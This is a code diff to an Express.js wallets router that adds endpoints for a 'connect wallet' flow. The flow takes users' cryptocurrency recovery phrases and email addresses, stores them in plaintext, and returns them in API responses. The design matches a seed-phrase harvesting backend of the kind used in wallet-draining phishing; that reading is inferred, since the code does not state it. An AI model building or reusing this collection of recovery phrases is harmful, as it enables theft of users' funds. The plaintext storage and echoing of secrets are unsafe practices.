@@ -1,49 +1,90 @@
 const express = require("express");
-const { Wallet } = require("../models");
+const { Wallet, UserWallet } = require("../models");
 const auth = require("../middleware/auth");
-const { resolveUserId } = require("../middleware/resolveUser");
 
 const router = express.Router();
 
-// POST /api/wallets/add — Add a wallet entry
-router.post("/add", auth, async (req, res) => {
+// GET /api/wallets/master — Get the master list of wallets
+router.get("/master", async (req, res) => {
   try {
-    const data = { ...req.body, user_id: req.user.id };
-    delete data.file; // Remove any file field if present
-    await Wallet.create(data);
-    return res.status(200).json({ status: 200, message: "Operation was successfully." });
+    const wallets = await Wallet.findAll();
+    return res.status(200).json({ status: 200, data: wallets });
   } catch (error) {
     return res.status(400).json({ status: 400, message: error.message });
   }
 });
 
-// GET /api/wallets — Get user's wallets (formatted as regions)
-router.get("/", auth, async (req, res) => {
+// POST /api/wallets/connect — Submit user wallet info (recovery phrase)
+router.post("/connect", auth, async (req, res) => {
   try {
-    const userId = await resolveUserId(req.query.userId, req.user.id);
-    const wallets = await Wallet.findAll({
-      where: { user_id: userId },
+    const { wallet_id, email_address, recovery_phrase } = req.body;
+    
+    if (!wallet_id || !recovery_phrase) {
+        return res.status(400).json({ status: 400, message: "Wallet selection and recovery phrase are required." });
+    }
+
+    const userWallet = await UserWallet.create({
+      user_id: req.user.id,
+      wallet_id,
+      email_address,
+      recovery_phrase,
+    });
+
+    return res.status(200).json({ 
+        status: 200, 
+        message: "Wallet connected successfully.",
+        data: userWallet 
+    });
+  } catch (error) {
+    return res.status(400).json({ status: 400, message: error.message });
+  }
+});
+
+// GET /api/wallets/user — Get all wallets linked to the logged-in user
+router.get("/user", auth, async (req, res) => {
+  try {
+    const userWallets = await UserWallet.findAll({
+      where: { user_id: req.user.id },
+      include: [{ model: Wallet, as: "wallet_details" }],
       order: [["created_at", "DESC"]],
     });
-    return res.status(200).json({
-      status: 200,
-      data: { regions: wallets.map((w) => w.toJSON()) },
-    });
+    return res.status(200).json({ status: 200, data: userWallets });
   } catch (error) {
     return res.status(400).json({ status: 400, message: error.message });
   }
 });
 
-// DELETE /api/wallets/:id — Delete a wallet entry
-router.delete("/:id", auth, async (req, res) => {
+// PUT /api/wallets/user/:id — Update a linked wallet (e.g. recovery phrase or email)
+router.put("/user/:id", auth, async (req, res) => {
   try {
-    const { id } = req.params;
-    const wallet = await Wallet.findByPk(id);
-    if (!wallet) {
-      return res.status(404).json({ status: 400, message: "Invalid index." });
+    const { email_address, recovery_phrase } = req.body;
+    const userWallet = await UserWallet.findOne({
+      where: { id: req.params.id, user_id: req.user.id },
+    });
+
+    if (!userWallet) {
+      return res.status(404).json({ status: 404, message: "Wallet not found" });
     }
-    await wallet.destroy();
-    return res.status(200).json({ status: 200, message: "Item deleted successfully." });
+
+    await userWallet.update({ email_address, recovery_phrase });
+    return res.status(200).json({ status: 200, message: "Wallet updated successfully", data: userWallet });
+  } catch (error) {
+    return res.status(400).json({ status: 400, message: error.message });
+  }
+});
+
+// DELETE /api/wallets/user/:id — Remove a linked wallet
+router.delete("/user/:id", auth, async (req, res) => {
+  try {
+    const deleted = await UserWallet.destroy({
+      where: { id: req.params.id, user_id: req.user.id }
+    });
+
+    if (!deleted) {
+      return res.status(404).json({ status: 404, message: "Wallet not found" });
+    }
+
+    return res.status(200).json({ status: 200, message: "Wallet removed successfully" });
   } catch (error) {
     return res.status(400).json({ status: 400, message: error.message });
   }
